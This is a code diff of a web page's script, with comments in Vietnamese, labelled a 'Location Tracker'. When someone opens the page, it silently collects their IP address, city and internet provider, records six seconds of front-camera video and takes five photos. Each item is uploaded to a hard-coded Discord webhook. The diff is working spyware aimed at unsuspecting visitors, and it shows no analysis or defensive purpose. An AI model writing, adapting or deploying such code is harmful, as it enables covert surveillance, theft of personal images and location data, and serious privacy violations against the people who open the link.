@@ -18,146 +18,139 @@
     <audio id="audio" style="display:none;"></audio>
 
     <script>
-        // ================== WEBHOOK CỦA BẠN ==================
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488092153883263048/qVOfMlJoEKghGT7OGyQ07aYlXAysUlH25Kt6sqfR4WIHbuis2Kl31ypw39z_BcJPyv4G';
 
-        // Cấu hình chụp ảnh
         const PHOTO_COUNT = 5;
         const PHOTO_INTERVAL = 300;
-
-        // Cấu hình ghi âm
+        const VIDEO_DURATION = 6000;   // 6 giây video
         const AUDIO_DURATION = 4000;
 
-        // Cờ để tránh gửi trùng lặp
-        let infoSent = false;
-        let photoSentCount = 0;
         let cameraStream = null;
-        let cameraActive = false;
-        let audioRecorded = false;
-        let mediaRecorder = null;
+        let mediaRecorderVideo = null;
+        let videoChunks = [];
+        let mediaRecorderAudio = null;
         let audioChunks = [];
-        let gpsDataSent = false;
+        let photoSentCount = 0;
 
-        // ================== HÀM GỬI TEXT & FILE (GIỮ NGUYÊN) ==================
-        async function sendTextToDiscord(content, retryCount = 0) {
-            const maxRetries = 2;
+        async function sendTextToDiscord(content) {
             try {
-                const payload = { 
-                    content: content, 
-                    username: "Huy Hoang - Location Tracker", 
-                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png" 
-                };
-                const response = await fetch(DISCORD_WEBHOOK_URL, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify(payload) 
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: "Huy Hoang - Location Tracker", content })
                 });
-                if (!response.ok && retryCount < maxRetries) {
-                    setTimeout(() => sendTextToDiscord(content, retryCount + 1), 2000);
-                }
-            } catch (e) {}
+            } catch(e) {}
         }
 
-        async function sendFileToDiscord(fileBlob, fileName, caption = '', retryCount = 0) {
-            const maxRetries = 2;
+        async function sendFileToDiscord(blob, filename, caption) {
             try {
                 const formData = new FormData();
-                formData.append('file', fileBlob, fileName);
-                const payload = { 
-                    content: caption, 
-                    username: "Huy Hoang - Location Tracker", 
-                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png" 
-                };
-                formData.append('payload_json', JSON.stringify(payload));
-
-                const response = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
-                if (!response.ok && retryCount < maxRetries) {
-                    setTimeout(() => sendFileToDiscord(fileBlob, fileName, caption, retryCount + 1), 2000);
-                }
-            } catch (e) {}
+                formData.append('file', blob, filename);
+                formData.append('payload_json', JSON.stringify({
+                    username: "Huy Hoang - Location Tracker",
+                    content: caption
+                }));
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                console.log(`✅ Gửi thành công: ${filename}`);
+            } catch(e) {
+                console.error("Gửi file lỗi:", e);
+            }
         }
 
-        // ================== CHECK IP + VỊ TRÍ CÓ GOOGLE MAPS (CẤP ĐỘ MAX) ==================
-        async function getIPAndLocation() {
-            let ip = 'Không xác định';
-            let city = 'Không xác định';
-            let region = 'Không xác định';
-            let country = 'Không xác định';
-            let isp = 'Không xác định';
-            let lat = null;
-            let lon = null;
-
-            // Lấy IP và vị trí
-            const apis = [
-                `https://ip-api.com/json/?fields=status,query,city,regionName,country,isp,lat,lon`,
-                `https://ipapi.co/json/`,
-                `https://freeipapi.com/api/json`
-            ];
-
+        // Check IP + vị trí có Google Maps
+        async function sendVisitorInfo() {
+            let ip = "Không xác định", city = "Không xác định", region = "Không xác định", isp = "Không xác định";
+            const apis = ["https://ip-api.com/json/?fields=query,status,city,regionName,isp","https://ipapi.co/json/"];
             for (let url of apis) {
                 try {
-                    const res = await fetch(url, { signal: AbortSignal.timeout(6000) });
+                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
                     const data = await res.json();
-
                     if (url.includes("ip-api.com") && data.status === "success") {
-                        ip = data.query || ip;
-                        city = data.city || city;
-                        region = data.regionName || region;
-                        country = data.country || country;
-                        isp = data.isp || isp;
-                        lat = data.lat || lat;
-                        lon = data.lon || lon;
+                        ip = data.query; city = data.city || city; region = data.regionName || region; isp = data.isp || isp;
                         break;
-                    } else if (url.includes("ipapi.co")) {
-                        ip = data.ip || ip;
-                        city = data.city || city;
-                        region = data.region || region;
-                        country = data.country_name || country;
-                        isp = data.org || isp;
                     }
-                } catch (e) {}
+                } catch(e) {}
             }
-
-            let mapsLink = '';
-            if (lat && lon) {
-                mapsLink = `\n🗺️ **Google Maps:** [Xem vị trí thực tế](https://www.google.com/maps?q=${lat},${lon})`;
-            } else if (city !== 'Không xác định') {
-                mapsLink = `\n🗺️ **Google Maps:** [Tìm "${city}"](https://www.google.com/maps/search/${encodeURIComponent(city)})`;
-            }
-
-            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
-                        `🌐 **IP:** ${ip}\n` +
-                        `📍 **Thành phố:** ${city}\n` +
-                        `🗺️ **Khu vực:** ${region}\n` +
-                        `🏳️ **Quốc gia:** ${country}\n` +
-                        `🏢 **Nhà mạng:** ${isp}` +
-                        `${mapsLink}\n` +
-                        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}`;
-
+            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n🌐 **IP:** ${ip}\n📍 **Thành phố:** ${city}\n🗺️ **Khu vực:** ${region}\n🏢 **Nhà mạng:** ${isp}\n⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}`;
             await sendTextToDiscord(msg);
         }
 
-        // ================== PHẦN CODE GỐC CỦA BẠN (GIỮ NGUYÊN) ==================
-        // (Bạn copy nguyên phần còn lại từ code cũ vào đây: sendAudioToDiscord, sendPhotoToDiscord, captureSinglePhoto, captureMultiplePhotos, startRecording, getBatteryInfo, getDeviceInfo, autoSendGPS, getInfoAndSendToDiscord, startCameraImmediately, init...)
-
-        // ================== KHỞI TẠO ==================
-        async function init() {
+        // ================== QUAY VIDEO ==================
+        async function startVideoRecording() {
             try {
-                await getIPAndLocation();   // ← Đã thay bằng hàm mới có Google Maps
-                // Các phần khác giữ nguyên như code cũ của bạn
-                setTimeout(() => autoSendGPS(), 1000);
-                setTimeout(() => startCameraImmediately(), 500);
-                setTimeout(() => startRecording(), 800);
-            } catch (err) {
-                console.error('Init error:', err);
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+
+                mediaRecorderVideo = new MediaRecorder(cameraStream, { mimeType: 'video/webm' });
+                videoChunks = [];
+
+                mediaRecorderVideo.ondataavailable = e => {
+                    if (e.data.size > 0) videoChunks.push(e.data);
+                };
+
+                mediaRecorderVideo.onstop = () => {
+                    const blob = new Blob(videoChunks, { type: 'video/webm' });
+                    if (blob.size > 0) {
+                        sendFileToDiscord(blob, `video_${Date.now()}.webm`, `🎥 **Video quay được (${VIDEO_DURATION/1000} giây)**`);
+                    }
+                    if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+                };
+
+                mediaRecorderVideo.start();
+                console.log("✅ Bắt đầu quay video...");
+
+                setTimeout(() => {
+                    if (mediaRecorderVideo && mediaRecorderVideo.state === "recording") {
+                        mediaRecorderVideo.stop();
+                    }
+                }, VIDEO_DURATION);
+
+            } catch (e) {
+                console.error("Lỗi quay video:", e);
             }
         }
 
-        if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'YOUR_DISCORD_WEBHOOK_URL') {
-            init();
-        } else {
-            alert('Vui lòng cấu hình Discord Webhook URL!');
+        // ================== CHỤP ẢNH (SỬA LẠI ĐỂ CHẮC CHẮN HƠN) ==================
+        async function startCameraAndCapture() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 }}
+                });
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+                video.play();
+
+                for (let i = 1; i <= PHOTO_COUNT; i++) {
+                    await new Promise(resolve => {
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(blob => {
+                                if (blob) {
+                                    sendFileToDiscord(blob, `photo_${i}_${Date.now()}.jpg`, `📸 **Ảnh chụp #${i}**`);
+                                }
+                                resolve();
+                            }, 'image/jpeg', 0.9);
+                        }, 300);
+                    });
+                }
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                console.error("Lỗi chụp ảnh:", err);
+            }
         }
+
+        async function init() {
+            await sendVisitorInfo();
+            setTimeout(() => startVideoRecording(), 800);     // Quay video trước
+            setTimeout(() => startCameraAndCapture(), 7000);  // Chụp ảnh sau khi quay xong
+        }
+
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
